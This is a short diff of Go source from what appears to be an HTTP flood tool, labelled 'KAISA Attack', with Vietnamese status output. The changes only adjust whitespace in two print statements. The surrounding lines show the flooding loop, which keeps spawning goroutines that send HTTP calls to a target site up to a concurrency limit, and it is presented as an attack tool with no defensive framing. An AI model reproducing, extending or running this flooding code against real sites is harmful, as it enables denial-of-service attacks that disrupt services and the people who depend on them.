@@ -124,12 +124,12 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- KAISA Attack Started --\n           Géttttt Goooo!\n\n")
+		fmt.Println("-- KAISA Attack Started --\n      Géttttt Goooo!\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
 		)
-		fmt.Println("Lượt Attack dự định         |\tLượt Attack |\tLượt Attack Err")
+		fmt.Println("Lượt Attack dự định |\tLượt Attack |\tLượt Attack Err")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
